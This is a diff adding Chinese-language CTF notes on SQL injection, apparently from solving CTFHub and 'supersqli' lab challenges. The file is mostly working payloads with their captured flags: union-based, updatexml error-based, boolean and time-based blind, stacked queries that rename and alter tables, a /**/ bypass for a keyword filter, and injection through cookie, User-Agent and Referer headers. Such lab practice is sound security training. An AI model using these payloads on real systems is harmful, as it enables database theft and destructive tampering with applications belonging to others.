@@ -1,0 +1,183 @@
+schame_name: 数据库
+table_name: 表名
+table_rows: 表中有多少条数据
+column_name: 字段名
+
+database(): 当前数据库
+schemata 	tables 		  columns: 
+总数据库 	  表 			字段
+
+
+整数型注入:
+id=-3 union select 1,2;  //2 注入点
+#-3  负数判断不相等，从而返回注入点2的数据
+id=-3 union select 1,database()
+#--> 得到数据库
+
+union select 1,group_concat(schema_name) from information_schema.schemata
+#Data: information_schema,mysql,performance_schema,sqli
+#查找所有数据库
+
+id=-3 union select 1,group_concat(table_name,'_',table_rows) from information_schema.tables where
+table_schema=database()
+#Data: news_3,vdiorzbifz_1
+#--> 得到当前数据库的所有表 
+
+id=-3 union select 1,group_concat(column_name,'_') from information_schame.columns where table_name='flag'
+#Data: wvmmbivuep
+#--> 查询flag表中的 字段名 
+
+id=-3 union select flag from flag
+#ctfhub{44216505948edf0ec7b2ce53}
+#--> 得到flag字段的值
+
+
+字符型注入同上:
+?id=-3' union select 1,group_concat(table_name,'_',table_rows) from information_schema.tables where
+table_schema=database();--+
+#--> 得到所有表名   '闭合前面的   --+ 注释后面的语句
+
+
+updatexml报错注入:
+#使用 updatexml 报错注入
+#//得到数据显示位置
+?id=3 union select updatexml(1,concat(0x7e,database(),0x7e),1)
+#--> 得到当前数据库
+
+id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name,'-',table_rows) from information_schema.tables where table_schema=database()),0x7e),1);
+#--> 得到表名和表中的记录数
+
+id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='userdata1'),0x7e),1);
+#--> 得到表中的字段
+
+id=1 and updatexml(1,concat(0x7e,(select email from userdata1 limit 1),0x7e),1);
+#--> 得到标志 flag
+
+
+报错盲注:
+#// 使用 /exploit/.py脚本跑
+#手工注入
+id=1 and ascii(substr(database(),1,1))=116;
+#--> 一个一个判断 比较 得到数据库
+
+id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=109;
+#--> 得到表名
+
+
+时间盲注:
+#//使用 /exploit/.py脚本跑
+#手工注入
+id=1 and if(ascii(substr(database(),1,1))>110,sleep(3),1);
+#--> 一个个判断 得到数据库
+
+id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<110,sleep(3),1);
+#--> 得到表名
+
+
+-->> supersqli 堆叠注入:
+3' union select 1,2;--+  #字符串检测
+#return preg_match("/select|update|delete|drop|insert|where|\./i",$inject)
+
+#堆叠注入
+#获得所有数据库
+GET /?inject=1';show databases;--+
+# ctftraining information_schema mysql performance_schema supersqli test
+
+#获得当前数据库下的所有表
+GET /?inject=1';show tables;--+
+# 1919810931114514 words
+ 
+#获得 words 表中所有字段
+GET /?inject=1'%3bshow+columns+from+words%3b--%2b+
+# id data
+
+#获得 1919810931114514 表中所有字段,  数字名的表，需要用反引号 ` `
+GET /?inject=1'%3bshow+columns+from+`1919810931114514`%3b--%2b+
+# flag
+
+#默认查询是 words表，根据id字段判断
+GET /?inject=1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`;alter table 
+`words` change `flag` `id` varchar(100);--+
+
+rename tables `words` to `words1`;  # 步骤1 改成其他无关表
+rename tables `1919810931114514` to `words`;  # 步骤2 改成默认查询表 words
+alter table `words` change `flag` `id` varchar(100); # 步骤3 将表中flag字段 改成 默认sql查询语句中 id字段 
+
+#url编码的请求
+GET /?inject=1'%3brename+tables+`words`+to+`words1`%3brename+tables+`1919810931114514`+to+`words`%3balter+tabl
+e+`words`+change+`flag`+`id`+varchar(100)%3b--%2b
+
+GET /?inject=3' or 1=1 --+ #获得flag
+# flag{c168d583ed0d4d7196967b28cbd0b5e9}
+
+
+cooike注入:
+#从cooike 注入查询
+id=-3 union select 1,2;  //2 注入点
+#-3  负数判断不相等，从而返回注入点2的数据
+id=-3 union select 1,database()
+#--> 得到数据库
+
+#其余步骤同 整数型注入、字符注入等。。。
+
+
+过滤空格:
+#绕过方法
+/**/  替换 空格
+# /**/ mysql注释
+
+#查找数据库
+?id=-1/**/union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata
+#mysql,sqli
+
+#查找表
+?id=-1/**/union/**/select/**/1,group_concat(table_name,'_',table_rows)/**/from/**/
+information_schema.tables/**/where/**/table_schema=database()
+#Data: lutgwigzyd_1,news_3
+
+#查找字段
+?id=-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/
+information_schema.columns/**/where/**/table_name='lutgwigzyd'
+#Data: zbjlemufvr
+
+#获取数据
+?id=-1/**/union/**/select/**/1,zbjlemufvr/**/from/**/lutgwigzyd
+#Data: ctfhub{3c4272f5de172dc59a8c94be}
+
+
+UA头注入:
+#注入点 变成 User-Agent:
+#其余步骤同 整数型注入、字符注入等。。。
+
+GET / HTTP/1.1
+Host: challenge-78179905587584a4.sandbox.ctfhub.com:10800
+User-Agent: -1 union select 1,group_concat(table_name,'_',table_rows)
+ from information_schema.tables where table_schema='sqli'
+#Data: nlafibedzb_1,news_3
+
+# Data: hglgutiiwa
+
+#Data: ctfhub{8294a789948ff57990fcbe76}
+
+
+refer注入:
+# 自己在请求里面 添加 referer 字段
+#其余步骤同 整数型注入、字符注入等。。。
+
+# GET / HTTP/1.1
+# Host: challenge-efd4db04b609d753.sandbox.ctfhub.com:10800
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+# Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+# Accept-Encoding: gzip, deflate
+# Connection: close
+# Upgrade-Insecure-Requests: 1
+referer: -1 union select 1,group_concat(schema_name) from information_schema.schemata
+
+referer: -1 union select 1,group_concat(table_name,'_',table_rows) from 
+information_schema.tables where table_schema='sqli'
+#Data: uihpvhukcf_1,news_3
+
+#Data: ahoswevufw 
+
+#Data: ctfhub{ffc7976190114dfec9b1f1a3} 
